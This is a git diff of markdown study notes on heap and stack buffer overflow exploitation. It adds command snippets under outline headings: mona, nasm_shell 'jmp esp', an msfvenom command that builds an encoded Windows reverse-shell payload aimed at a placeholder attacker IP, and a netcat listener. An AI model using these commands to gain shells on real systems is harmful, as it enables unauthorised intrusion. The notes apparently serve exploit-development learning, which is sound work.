@@ -25,7 +25,7 @@ A buffer overflow occurring in the heap data area is referred to as a heap overf
 
 
 
-![Image result for heap based buffer overflow](https://www.researchgate.net/profile/Roshan_Ragel/publication/230559751/figure/fig6/AS:669389712027653@1536606352473/Heap-based-Buffer-Overflow-Attack.png)
+<img src="https://www.researchgate.net/profile/Roshan_Ragel/publication/230559751/figure/fig6/AS:669389712027653@1536606352473/Heap-based-Buffer-Overflow-Attack.png" alt="Image result for heap based buffer overflow" style="zoom:50%;" />
 
 ## exploitation
 
@@ -59,15 +59,43 @@ A buffer overflow occurring in the heap data area is referred to as a heap overf
 
  ##### introduction to mona
 
+```
+!mona
+```
+
+
+
 ##### identifying the module with out aslr,dep,seh
 
 ##### nasm shell
 
+```
+msf-nasm_shell
+
+nasm>jmp esp
+```
+
+
+
 #### genrating shellcode
+
+```
+msfvenom -p windows/shell_reverse_tcp lhost=attackerip lport=attackerport -f fileformat -e x86/shikata_ga_nai -b "badcharcters"
+```
+
+
 
 #### optimising the shellcode
 
+
+
 #### getting  reverse shell
+
+```
+nc -nlvp port to connect
+```
+
+
 
 #### improving the exploit
 
